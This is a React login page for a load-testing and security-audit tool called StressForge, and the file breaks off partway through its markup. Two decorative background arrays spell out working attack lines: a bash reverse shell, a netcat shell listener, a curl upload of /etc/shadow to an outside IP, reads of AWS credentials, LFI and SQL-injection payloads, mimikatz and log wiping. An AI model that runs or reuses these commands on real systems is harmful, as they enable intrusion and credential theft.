"use client";

import { useState, useEffect } from "react";
import { useTheme } from "@/lib/theme-context";
import { useRouter } from "next/navigation";
import { useAuth } from "@/lib/auth-context";
import { getBackendUrl } from "@/lib/api-url";
import { useLoading } from "@/lib/loading-context";
import { GoogleOAuthProvider, useGoogleLogin } from "@react-oauth/google";
import { Zap, User, ArrowRight, Activity, Sun, Moon, Database, Shield, AlertTriangle, X, CheckCircle2, Mail, Lock } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

const CAPABILITIES_INFO: Record<string, { title: string; description: string; details: string[]; icon: any; color: "emerald" | "cyan" | "purple" | "rose"; badge: string }> = {
  "Simulaciones de Carga": {
    title: "MOTOR DE SIMULACIÓN Y ESTRÉS K6/ARTILLERY",
    description: "Orquestación de pruebas de rendimiento a gran escala. Simula miles de usuarios concurrentes inundando los endpoints con peticiones HTTP/WS para medir latencia, tasa de éxito y límites de colapso de la infraestructura.",
    details: [
      "Simulación de picos masivos (Spike Testing) y carga sostenida.",
      "Integración de motores distribuidos: k6, Artillery y Autocannon.",
      "Análisis de percentiles de latencia en tiempo real (p95, p99).",
      "Medición dinámica de rendimiento en peticiones por segundo (RPS)."
    ],
    icon: Zap,
    color: "emerald",
    badge: "STRESS_ENGINE"
  },
  "Monitoreo de Telemetría": {
    title: "PERFILADOR DE RECURSOS DEL SISTEMA",
    description: "Captura en tiempo real del estado de hardware del servidor backend durante las ráfagas de tráfico. Permite correlacionar el volumen de peticiones concurrentes con la degradación del procesador y memoria del host.",
    details: [
      "Lectura dinámica de núcleos de CPU y consumo de memoria RAM.",
      "Detección de fugas de memoria (Memory Leaks) en hilos de ejecución.",
      "Correlación de telemetría de red con tiempos de respuesta.",
      "Mapeo de cuellos de botella mediante APIs de telemetría interna."
    ],
    icon: Database,
    color: "cyan",
    badge: "METRICS_PROFILER"
  },
  "Pruebas de Red y Conectividad": {
    title: "AUDITORÍA DE PROTOCOLOS BAJA LATENCIA",
    description: "Evaluación del comportamiento de sockets TCP y canales multiplexados gRPC/WebSockets ante transmisiones de alta frecuencia. Analiza la resiliencia en la persistencia de conexiones bidireccionales.",
    details: [
      "Pruebas de saturación en túneles WebSocket de flujo continuo.",
      "Medición de latencia de red mediante conexiones concurrentes gRPC.",
      "Detección de pérdidas de paquetes y desconexiones imprevistas.",
      "Simulación de congestión de red (Network Jitter) y latencia artificial."
    ],
    icon: Activity,
    color: "purple",
    badge: "NETWORK_STRESS"
  },
  "Auditoría de Seguridad y Resiliencia": {
    title: "MOTOR DE FUZZING Y RESILIENCIA DE DATOS",
    description: "Módulo de análisis de vulnerabilidades lógicas y persistencia bajo estrés. Evalúa la respuesta de los gestores de base de datos y memoria caché ante payloads de inyección SQL y desbordamientos.",
    details: [
      "Fuzzing de parámetros de entrada con cargas maliciosas bajo carga.",
      "Pruebas de resiliencia en bases de datos PostgreSQL y Redis caché.",
      "Validación de políticas de Rate Limiting y bypass de WAF.",
      "Auditoría de integridad del almacenamiento ante transacciones fallidas."
    ],
    icon: Shield,
    color: "rose",
    badge: "SECURITY_COMPLIANCE"
  }
};

const COLOR_SCHEMES = {
  emerald: {
    border: "border-emerald-500/30",
    glow: "bg-emerald-500/10",
    glowBorder: "shadow-[0_0_30px_rgba(16,185,129,0.25)]",
    textAccent: "text-emerald-400",
    textLight: "text-emerald-700 dark:text-emerald-400",
    badgeBg: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20",
    accentBg: "bg-emerald-500",
    hoverBg: "hover:bg-emerald-400",
    bullet: "bg-emerald-500 dark:bg-emerald-400",
    buttonAccent: "bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-emerald-500/20 hover:shadow-emerald-400/30",
    corners: "border-emerald-500/80"
  },
  cyan: {
    border: "border-cyan-500/30",
    glow: "bg-cyan-500/10",
    glowBorder: "shadow-[0_0_30px_rgba(6,182,212,0.25)]",
    textAccent: "text-cyan-400",
    textLight: "text-cyan-700 dark:text-cyan-400",
    badgeBg: "bg-cyan-500/10 text-cyan-400 border-cyan-500/20",
    accentBg: "bg-cyan-500",
    hoverBg: "hover:bg-cyan-400",
    bullet: "bg-cyan-500 dark:bg-cyan-400",
    buttonAccent: "bg-cyan-500 hover:bg-cyan-400 text-slate-950 shadow-cyan-500/20 hover:shadow-cyan-400/30",
    corners: "border-cyan-500/80"
  },
  purple: {
    border: "border-purple-500/30",
    glow: "bg-purple-500/10",
    glowBorder: "shadow-[0_0_30px_rgba(168,85,247,0.25)]",
    textAccent: "text-purple-400",
    textLight: "text-purple-700 dark:text-purple-400",
    badgeBg: "bg-purple-500/10 text-purple-400 border-purple-500/20",
    accentBg: "bg-purple-500",
    hoverBg: "hover:bg-purple-400",
    bullet: "bg-purple-500 dark:bg-purple-400",
    buttonAccent: "bg-purple-500 hover:bg-purple-400 text-slate-950 shadow-purple-500/20 hover:shadow-purple-400/30",
    corners: "border-purple-500/80"
  },
  rose: {
    border: "border-rose-500/30",
    glow: "bg-rose-500/10",
    glowBorder: "shadow-[0_0_30px_rgba(244,63,94,0.3)]",
    textAccent: "text-rose-400",
    textLight: "text-rose-700 dark:text-rose-400",
    badgeBg: "bg-rose-500/10 text-rose-400 border-rose-500/20",
    accentBg: "bg-rose-500",
    hoverBg: "hover:bg-rose-400",
    bullet: "bg-rose-500 dark:bg-rose-400",
    buttonAccent: "bg-rose-500 hover:bg-rose-400 text-slate-950 shadow-rose-500/20 hover:shadow-rose-400/30",
    corners: "border-rose-500/80"
  }
};

const CODE_LINES_LEFT = [
  "tcpdump -i eth0 -vvv -A 'port 80 or port 443'",
  "nc -lvnp 4445 -e /bin/sh",
  "gobuster dir -u https://target.local/ -w common.txt -t 50",
  "[INFO] Threat Actor persistence module injected into /etc/cron.hourly/update-svc",
  "[DATA_STEAL] Decrypting SSL proxy handshake vectors...",
  "Session hijacked completely. Closing connection pipes safely.",
  "  ██████╗ ██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ██████╗ ",
  " ██╔════╝██╔═══██╗██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗",
  " ██║     ██║   ██║██████╔╝█████╗      ██║  ██║██████╔╝██║   ██║██████╔╝",
  " ██║     ██║   ██║██╔══██╗██╔══╝      ██║  ██║██╔══██╗██║   ██║██╔═══╝ ",
  " ╚██████╗╚██████╔╝██║  ██║███████╗    ██████╔╝██║  ██║╚██████╔╝██║     ",
  "  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ",
  "  [!] CAUTION: INTRUSION COMPLIANCE TESTING & DATA EXTRACTION UNIT",
  "NMAP -sV -sC -Pn -T4 10.128.42.18",
  "[!] Target OS: Linux Kernel 5.15.0-x86_64 (Ubuntu Enterprise)",
  "GET /api/v2/auth/login HTTP/2",
  "Host: api.target-internal.local",
  "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
  "POST /api/v2/internal/fetch-report HTTP/1.1",
  `{"document_id": "../../../../../etc/passwd\\u0000", "bypass_filter": true}`,
  "[+] Local File Inclusion (LFI) vulnerability discovered on endpoint /fetch-report",
  "SELECT usename, passwd FROM pg_shadow WHERE usename = 'postgres';",
  "[INFO] Spawning reverse TCP shell handler on port 4444...",
  "sh -i >& /dev/tcp/10.10.14.5/4444 0>&1",
  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "whoami && id",
  "uid=0(root) gid=0(root) groups=0(root)",
  "[STAGE 2] Lateral movement initiated via automated SSH pivoting...",
  "cat ~/.ssh/authorized_keys",
  "cat /home/deploy/.aws/credentials",
  " ███████╗████████╗██████╗ ███████╗███████╗███████╗██████╗ ██████╗  ██████╗ ███████╗",
  " ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝ ██╔════╝",
  " ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗██████╔╝██████╔╝██║  ███╗█████╗  ",
  " ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ",
  " ███████║   ██║   ██║  ██║███████╗███████║███████║██║     ██║  ██║╚██████╔╝███████╗",
  " ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝",
  "[+] LOAD ENGINE: STRESSFORGE // SECSUITE v2.4",
  "[+] TARGET: AGENT ATTACHED",
  "[+] THREADS: ALLOCATED (MAX_STRESS_LEVEL: HIGH)",
  "[!] READY FOR PENETRATION & PERFORMANCE TESTING",
  "",
  "[!] WARNING: AUTHORIZED TESTING ONLY. ALL ACTIONS ARE LOGGED.",
  "[SYSTEM CHECK]",
  "  ↳ MEMORY USAGE : [████████████░░░░░░] 62%",
  "  ↳ CPU CORE ALLOC: 8 WORKERS",
  "  ↳ OPEN FILE DESCRIPTORS LIMIT: 65535 (OPTIMAL)",
  "",
  "[🚀] PRESS [CTRL+C] TO ABORT | INITIATING TEST SEQUENCE IN 3.. 2.. 1..",
  "   _  _  _  _  ____  ____  _  _  __ _  ____   ____  _  _  ____  ____  ____  _  _ ",
  "  ( \\/ )/ )( \\(_  _)(  _ \\/ )( \\(  ( \\/ ___\\ (_  _)/ )( \\(_  _)(  __)(  _ \\/ )( \\",
  "   / \\/ \\) \\/ (  )(   )   /) \\/ (/    /\\___ \\   )(  ) __ (  )(   ) _)  )   /\\_  _/",
  "  \\_)(_/\\____/ (__) (__\\_)\\____/\\_)(_/\\____/  (__) \\_)(_/(__) (____)(__\\_)(__)  ",
  "",
  "  [SYSTEM OVERRIDE IN PROGRESS - HOST: LOG_NODE_PRIMARY]",
  "curl -X POST -d @/etc/shadow http://10.10.14.5:8000/loot/shadow.txt",
  "SELECT credit_card_hash, cvv, expiry FROM billing.vault_records LIMIT 50000;",
  "tar -czf - /var/www/html/secure_vault | openssl enc -aes-256-cbc -e -out vault.enc",
  "[CRITICAL] Exfiltrating encrypted vault.enc to C2 server (185.220.101.4)...",
  "GET /ws/c2/heartbeat?session=K3yL0gg3r_Active HTTP/1.1",
  "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "hydra -L users.txt -P passwords.txt ssh://10.128.42.19 -t 4 -V",
  "[ATTACK] SQLi payload triggered: ' UNION SELECT null,CONCAT(username,':',password) FROM users--",
  "cat /proc/net/arp",
  "arp-scan --interface=eth0 --localnet",
  "[INFO] Hijacking active session cookie: _sess_id=cf83d298a1a39fbc812",
  "ln -sf /dev/null ~/.bash_history && history -c",
  "  _______  _______  ______  _______  __    __  _______  _______ ",
  " |       ||       ||    _ ||_     _||  |  |  ||       ||       |",
  " |       ||   _   ||   | ||  |   |  |  |  |  ||    _  ||_     _|",
  " |       ||  | |  ||   |_||_ |   |  |  |_ |  ||   |_| |  |   |  ",
  " |      _||  |_|  ||    __  ||   |  |       ||    ___|  |   |  ",
  " |     |_ |       ||   |  | ||   |  |       ||   |      |   |  ",
  " |_______||_______||___|  |_||___|  |_______||___|      |___|  ",
  "  [!] COMPROMISED NODE BACKDOOR INSTALLED SUCCESSFULLY"
];

const CODE_LINES_RIGHT = [
  "tcpdump -i eth0 -vvv -A 'port 80 or port 443'",
  "nc -lvnp 4445 -e /bin/sh",
  "gobuster dir -u https://target.local/ -w common.txt -t 50",
  "[INFO] Threat Actor persistence module injected into /etc/cron.hourly/update-svc",
  "[DATA_STEAL] Decrypting SSL proxy handshake vectors...",
  "Session hijacked completely. Closing connection pipes safely.",
  "  ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ ███████╗███████╗███████╗",
  "  ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝",
  "  ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝█████╗  ███████╗█████╗  ",
  "  ██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗██╔══╝  ╚════██║██╔══╝  ",
  "  ██║     ██║  ██║╚██████╔╝███████╗██║  ██║███████╗███████║███████║",
  "  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝",
  "  [+] AUTOMATED SECURITY ASSESSMENT & DATABASE INTEGRITY FRAMEWORK",
  "[DEBUG] Port 22/tcp OPEN [OpenSSH 8.9p1]",
  "[DEBUG] Port 80/tcp OPEN [nginx 1.18.0]",
  "[DEBUG] Port 5432/tcp OPEN [PostgreSQL 14.2]",
  "HTTP/2 403 Forbidden - Security Shield: Cloudflare WAF v4.0",
  "HTTP/1.1 200 OK - Content-Type: application/octet-stream",
  "[DUMP] root:x:0:0:root:/root:/bin/bash",
  "[DUMP] postgres:x:114:122::/var/lib/postgresql:/bin/bash",
  "[SUCCESS] Password hash captured: postgres:$6$rounds=40000$yG9... (SHA-512)",
  "   ██████╗   ██████╗  ██████╗  ████████╗ ██╗   ██╗ ██████╗ ████████╗",
  "  ██╔════╝  ██╔═══██╗ ██╔══██╗ ╚══██╔══╝ ██║   ██║ ██╔══██╗╚══██╔══╝",
  "  ██║  ███╗ ██║   ██║ ██████╔╝    ██║    ██║   ██║ ██████╔╝   ██║   ",
  "  ██║   ██║ ██║   ██║ ██╔══██╗    ██║    ██║   ██║ ██╔═══╝    ██║   ",
  "  ╚██████╔╝ ╚██████╔╝ ██║  ██║    ██║    ╚██████╔╝ ██║        ██║   ",
  "   ╚═════╝  ╚═════╝   ╚═╝  ╚═╝    ╚═╝     ╚═════╝  ╚═╝        ╚═╝   ",
  "[+] EXPLOIT STAGE 2: PAYLOAD DELIVERED",
  "[+] SHELL: ALLOCATED (TTY /dev/pts/3)",
  "[+] PERSISTENCE: SYSTEMD SERVICE INJECTED",
  "[!] ROOTKIT LOADED — NODE OVERRIDDEN FULLY",

  "Connection received from 10.128.42.18 on port 4444",
  "  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
  "  [SYSTEM SHIELD CRITICAL] RAM MALWARE INJECTION INJECTED AT CORRUPT REGISTER 0x0F8",
  "  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
  "[STAGER] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.128.42.18:59124)",
  "[SYSINFO] Hostname: prod-db-server-01.internal",
  "[!] Warning: EDR Agent 'DefendX' detected process anomalies.",
  "[MUTING] EDR bypass injected successfully via memory unhooking (NtProtectVirtualMemory)",
  "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
  "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "[DB_TEST] Query completed: 50,000 rows affected.",
  "[DATA_STEAL] Chunk 01/20 uploaded successfully (SHA-256 matched)",
  "[DATA_STEAL] Chunk 02/20 uploaded successfully (SHA-256 matched)",
  "[DATA_STEAL] Data exfiltration stream active -> 4.2 MB/s",
  "   _    ___    ____ _  _    ____  _  _  _  _  ____ ",
  "  ( )  / _ \\ / ___| )/ )  (  _ \\/ )( \\( \\/ )(  _ \\",
  "   ) (__  ()  ) )__  )  (    ) __/) __ ( )  (  ) __/",
  "  (____)\\___/ \\____(_)\\_)  (__)  \\_)(_/(_/\\_)(__)  ",
  "  [LOCKDOWN BYPASS DETECTED - SPOOFING MAC MODULES]",
  "[SUCCESS] SSH Brute Force matched credentials -> deploy:P@ssw0rd2026",
  "HTTP/1.1 200 OK - Body: [admin:pbkdf2_sha256$260000$fG8a2x...]",
  "Interface eth0: Found 12 live nodes in the internal private segment.",
  "Injecting ARP cache poisoning vectors [10.128.42.1 -> 10.128.42.19]",
  "[DEBUG] intercepting cleartext HTTP credentials from network broadcast...",
  "[MEM_DUMP] Dumping lsass.exe process memory to C:\\Windows\\Temp\\debug.dmp",
  "mimikatz # sekurlsa::logonpasswords",
  "[*] Extracting NTLM Hash -> Administrator:514    :aad3b435b51404ee...",
  "[CLEANUP] Deleting audit trails and shredding web logs...",
  "[STATUS] Access maintained via persistent crontab backdoor. Attack Cycle Closed."
];

function LoginForm() {
  const { theme, setTheme } = useTheme();
  const isDarkMode = theme === "dark";
  const [username, setUsername] = useState("");
  const [isRegister, setIsRegister] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loginInput, setLoginInput] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [selectedCapability, setSelectedCapability] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const googleLogin = useGoogleLogin({
    onSuccess: async (tokenResponse) => {
      setIsLoading(true);
      setError(null);
      try {
        const res = await fetch(`${getBackendUrl()}/api/auth/google`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ credential: tokenResponse.access_token }),
        });
        if (!res.ok) {
          const err = await res.json().catch(() => ({}));
          throw new Error(err.error || "Error al autenticar con Google.");
        }
        const data = await res.json();
        login({ username: data.username, userId: data.userId, token: data.token });
        startLoading();
        router.push("/dashboard");
      } catch (err: any) {
        setError(err.message || "Fallo de conexión con Google.");
      } finally {
        setIsLoading(false);
      }
    },
    onError: () => setError("Error al iniciar sesión con Google."),
    flow: "implicit",
  });

  const handleGoogleAuth = () => googleLogin();

  const router = useRouter();
  const { login } = useAuth();
  const { startLoading } = useLoading();

  // Dynamic backend health status monitoring
  const [isBackendUp, setIsBackendUp] = useState<boolean | null>(null);

  useEffect(() => {
    const checkHealth = async () => {
      try {
        const res = await fetch("http://localhost:8080/api/system/resources");
        setIsBackendUp(res.ok);
      } catch (err) {
        setIsBackendUp(false);
      }
    };
    checkHealth();
    const interval = setInterval(checkHealth, 5000);
    return () => clearInterval(interval);
  }, []);

  // 3D Tilt state variables for modal card
  const [rotateX, setRotateX] = useState(0);
  const [rotateY, setRotateY] = useState(0);

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    const card = e.currentTarget;
    const rect = card.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    const xc = rect.width / 2;
    const yc = rect.height / 2;
    const rx = -((y - yc) / yc) * 8; // Max 8 degrees tilt on X
    const ry = ((x - xc) / xc) * 8;  // Max 8 degrees tilt on Y
    setRotateX(rx);
    setRotateY(ry);
  };

  const handleMouseLeave = () => {
    setRotateX(0);
    setRotateY(0);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: Record<string, string> = {};

    if (isRegister) {
      if (!username.trim()) newErrors.username = "El nombre de usuario es obligatorio";
      if (!email.trim()) newErrors.email = "El correo es obligatorio";
      else if (!/\S+@\S+\.\S+/.test(email)) newErrors.email = "Correo inválido";
      if (!password) newErrors.password = "La contraseña es obligatoria";
      if (password !== confirmPassword) newErrors.confirmPassword = "Las contraseñas no coinciden";
    } else {
      if (!loginInput.trim()) newErrors.loginInput = "El usuario o correo es obligatorio";
      if (!password) newErrors.password = "La contraseña es obligatoria";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setError(null);
    setErrors({});

    try {
      const endpoint = `/api/auth/${isRegister ? "register" : "login"}`;
      const body = isRegister
        ? { username: username.trim(), email: email.trim(), password }
        : { identifier: loginInput.trim(), password };

      const res = await fetch(`${getBackendUrl()}${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      if (!res.ok) {
        const errorData = await res.json().catch(() => ({}));
        throw new Error(errorData.error || `Error al ${isRegister ? "registrarse" : "iniciar sesión"}.`);
      }

      const data = await res.json();

      if (isRegister) {
        setError("¡Cuenta creada! Ahora iniciá sesión con tus datos.");
        setIsRegister(false);
        setLoginInput(data.username || username.trim());
        setPassword("");
        setConfirmPassword("");
        setEmail("");
        setUsername("");
      } else {
        login({ username: data.username, userId: data.userId, token: data.token });
        startLoading();
        router.push("/dashboard");
      }
    } catch (err: any) {
      setError(err.message || "Fallo de conexión con el motor de autenticación.");
    } finally {
      setIsLoading(false);
    }
  };

  const getLeftLineColor = (line: string) => {
    if (line.includes("██") || line.includes("┌─") || line.includes("│") || line.includes("_  _") || line.includes("╚═╝")) {
      return isDarkMode ? "text-emerald-400 font-black drop-shadow-[0_0_8px_rgba(34,197,94,0.6)]" : "text-emerald-800 font-black drop-shadow-[0_0_3px_rgba(16,185,129,0.35)]";
    }
    if (line.includes("_______") || line.includes("|       |")) {
      return isDarkMode ? "text-teal-400 font-black" : "text-teal-800 font-black drop-shadow-[0_0_3px_rgba(13,148,136,0.3)]";
    }
    if (line.includes("[CRITICAL]") || line.includes("tar -czf") || line.includes("WARNING:")) {
      return isDarkMode ? "text-rose-500 font-black animate-pulse drop-shadow-[0_0_10px_rgba(244,63,94,0.7)]" : "text-rose-700 font-black animate-pulse drop-shadow-[0_0_4px_rgba(225,29,72,0.35)]";
    }
    if (line.includes("[+]") || line.includes("uid=0")) {
      return isDarkMode ? "text-emerald-400 font-black" : "text-emerald-800 font-black drop-shadow-[0_0_3px_rgba(16,185,129,0.3)]";
    }
    if (line.includes("SELECT") || line.includes("POST") || line.includes("GET")) {
      return isDarkMode ? "text-cyan-400 font-black" : "text-cyan-800 font-black drop-shadow-[0_0_3px_rgba(8,145,178,0.3)]";
    }
    if (line.includes("[ATTACK]") || line.includes("[!]")) {
      return isDarkMode ? "text-amber-400 font-black" : "text-amber-700 font-black drop-shadow-[0_0_3px_rgba(217,119,6,0.3)]";
    }
    return isDarkMode ? "text-slate-200/60 font-bold font-mono" : "text-slate-800/80 font-bold font-mono";
  };

  const getRightLineColor = (line: string) => {
    if (line.includes("██") || line.includes("▓▓") || line.includes("_    _") || line.includes("╚═╝")) {
      return isDarkMode ? "text-cyan-400 font-black drop-shadow-[0_0_8px_rgba(34,211,238,0.6)]" : "text-cyan-800 font-black drop-shadow-[0_0_3px_rgba(6,182,212,0.4)]";
    }
    if (line.includes("_____  _")) {
      return isDarkMode ? "text-purple-400 font-black" : "text-purple-700 font-black drop-shadow-[0_0_3px_rgba(147,51,234,0.3)]";
    }
    if (line.includes("[DATA_STEAL]") || line.includes("[!]")) {
      return isDarkMode ? "text-rose-500 font-black drop-shadow-[0_0_8px_rgba(244,63,94,0.5)]" : "text-rose-700 font-black drop-shadow-[0_0_3px_rgba(225,29,72,0.3)]";
    }
    if (line.includes("[SUCCESS]") || line.includes("[STATUS]")) {
      return isDarkMode ? "text-emerald-400 font-black" : "text-emerald-700 font-black drop-shadow-[0_0_3px_rgba(22,163,74,0.3)]";
    }
    if (line.includes("[DUMP]") || line.includes("mimikatz")) {
      return isDarkMode ? "text-amber-400 font-black" : "text-amber-700 font-black drop-shadow-[0_0_3px_rgba(217,119,6,0.3)]";
    }
    if (line.includes("[DEBUG]")) {
      return isDarkMode ? "text-sky-400 font-black" : "text-sky-700 font-black drop-shadow-[0_0_3px_rgba(3,105,161,0.3)]";
    }
    return isDarkMode ? "text-slate-200/60 font-bold font-mono" : "text-slate-800 font-bold font-mono";
  };

  const activeCap = selectedCapability ? CAPABILITIES_INFO[selectedCapability] : null;
  const colorScheme = activeCap ? COLOR_SCHEMES[activeCap.color] : COLOR_SCHEMES.emerald;

  return (
    <>
      <style jsx global>{`
        @keyframes scroll-code {
          0% {
            transform: translateY(0);
          }
          100% {
            transform: translateY(-50%);
          }
        }
      `}</style>
      <div className={`relative flex min-h-screen flex-col overflow-hidden transition-colors duration-700 ${isDarkMode ? "bg-slate-950 text-slate-100" : "bg-slate-50 text-slate-900"}`}>
        {/* Background: Glow Orbs & Code Stream */}
        <div aria-hidden="true" className="pointer-events-none absolute inset-0 overflow-hidden">
          <div className={`absolute -top-40 left-1/2 h-[600px] w-[600px] -translate-x-1/2 rounded-full blur-[120px] transition-colors duration-500 ${isDarkMode ? "bg-emerald-600/10" : "bg-emerald-500/10"}`} />
          <div className={`absolute bottom-0 left-0 h-[400px] w-[400px] -translate-x-1/2 translate-y-1/2 rounded-full blur-[100px] transition-colors duration-500 ${isDarkMode ? "bg-cyan-600/10" : "bg-cyan-500/10"}`} />
          <div className={`absolute right-0 top-1/2 h-[350px] w-[350px] translate-x-1/2 -translate-y-1/2 rounded-full blur-[90px] transition-colors duration-500 ${isDarkMode ? "bg-purple-500/5" : "bg-purple-500/10"}`} />

          <div
            className={`absolute inset-0 flex overflow-hidden font-mono text-[clamp(11px,0.8vw,17px)] transition-opacity duration-300 ${isDarkMode ? "opacity-[0.35]" : "opacity-[0.78]"}`}
            style={{
              maskImage: "linear-gradient(to bottom, transparent, black 15%, black 85%, transparent)",
              WebkitMaskImage: "linear-gradient(to bottom, transparent, black 15%, black 85%, transparent)"
            }}
          >
            {/* Left Column Code Stream */}
            <div className={`absolute left-0 top-0 h-full w-1/2 overflow-hidden border-r ${isDarkMode ? "border-white/[0.02]" : "border-slate-900/[0.04]"}`}>
              <div
                className="absolute flex w-full flex-col text-left"
                style={{
                  animation: "scroll-code 55s linear infinite",
                  height: "200%"
                }}
              >
                <div className="flex h-1/2 flex-col justify-start pt-4">
                  {CODE_LINES_LEFT.map((line, i) => (
                    <div key={`l1-${i}`} className="flex h-6 items-center overflow-hidden">
                      <pre className={`${getLeftLineColor(line)} block overflow-hidden text-ellipsis whitespace-pre pl-6 tracking-wide`}>
                        {line}
                      </pre>
                    </div>
                  ))}
                </div>
                <div className="flex h-1/2 flex-col justify-start pt-4" aria-hidden="true">
                  {CODE_LINES_LEFT.map((line, i) => (
                    <div key={`l2-${i}`} className="flex h-6 items-center overflow-hidden">
                      <pre className={`${getLeftLineColor(line)} block overflow-hidden text-ellipsis whitespace-pre pl-6 tracking-wide`}>
                        {line}
                      </pre>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Right Column Code Stream */}
            <div className="absolute right-0 top-0 h-full w-1/2 overflow-hidden">
              <div
                className="absolute flex w-full flex-col items-end text-right"
                style={{
                  animation: "scroll-code 60s linear infinite",
                  height: "200%"
                }}
              >
                <div className="flex h-1/2 w-full flex-col justify-start items-end pr-6 pt-4">
                  {CODE_LINES_RIGHT.map((line, i) => (
                    <div key={`r1-${i}`} className="flex h-6 w-full items-center justify-end overflow-hidden">
                      <pre className={`${getRightLineColor(line)} block overflow-hidden text-right whitespace-pre tracking-wide`}>
                        {line}
                      </pre>
                    </div>
                  ))}
                </div>
                <div className="flex h-1/2 w-full flex-col justify-start items-end pr-6 pt-4" aria-hidden="true">
                  {CODE_LINES_RIGHT.map((line, i) => (
                    <div key={`r2-${i}`} className="flex h-6 w-full items-center justify-end overflow-hidden">
                      <pre className={`${getRightLineColor(line)} block overflow-hidden text-right whitespace-pre tracking-wide`}>
                        {line}
                      </pre>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* Grid pattern overlay */}
          <div
            className={`absolute inset-0 transition-opacity duration-300 ${isDarkMode ? "opacity-[0.02]" : "opacity-[0.03]"}`}
            style={{
              backgroundImage: isDarkMode
                ? "linear-gradient(rgba(255,255,255,1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,1) 1px, transparent 1px)"
                : "linear-gradient(rgba(15,23,42,1) 1px, transparent 1px), linear-gradient(90deg, rgba(15,23,42,1) 1px, transparent 1px)",
              backgroundSize: "40px 40px",
            }}
          />
        </div>

        {/* Header */}
        <header className={`relative z-20 flex items-center justify-between border-b px-6 py-4 backdrop-blur-md sm:px-10 transition-colors duration-300 ${isDarkMode ? "border-white/5 bg-slate-950/40" : "border-slate-200/80 bg-white/60"}`}>
          <div className="flex items-center gap-3">
            <div className={`flex h-9 w-9 items-center justify-center rounded-xl shadow-lg ${isDarkMode ? "bg-emerald-500 shadow-emerald-500/20 text-slate-950" : "bg-emerald-600 shadow-emerald-600/20 text-white"}`}>
              <Zap className="h-5 w-5" />
            </div>
            <div className="flex flex-col">
              <span className={`text-sm font-bold tracking-wider uppercase transition-colors duration-300 ${isDarkMode ? "text-white" : "text-slate-900"}`}>
                StressForge // SecSuite
              </span>
              <div className="flex items-center gap-1.5 text-[10px] font-mono">
                <span className={`h-2 w-2 rounded-full ${isBackendUp === true ? "bg-emerald-500 animate-pulse" : isBackendUp === false ? "bg-rose-500" : "bg-amber-500 animate-ping"}`} />
                <span className={isDarkMode ? "text-slate-400" : "text-slate-500"}>
                  {isBackendUp === true ? "SYS_ONLINE" : isBackendUp === false ? "SYS_OFFLINE (FALLBACK)" : "CONNECTING..."}
                </span>
              </div>
            </div>
          </div>

          <button
            onClick={() => setTheme(isDarkMode ? 'light' : 'dark')}
            className={`flex h-9 w-9 items-center justify-center rounded-xl border transition-all duration-200 hover:scale-105 ${isDarkMode ? "border-white/10 bg-white/5 text-amber-400 hover:bg-white/10" : "border-slate-200 bg-slate-100 text-purple-600 hover:bg-slate-200"}`}
            aria-label="Toggle Theme"
          >
            {isDarkMode ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
          </button>
        </header>

        {/* Main Container */}
        <main className="relative z-10 flex flex-1 flex-col items-center justify-center p-6 my-auto">
          <div className="w-full max-w-xl">
            {/* Card Wrapper with 3D Tilt capability */}
            <div
              // onMouseMove={handleMouseMove}
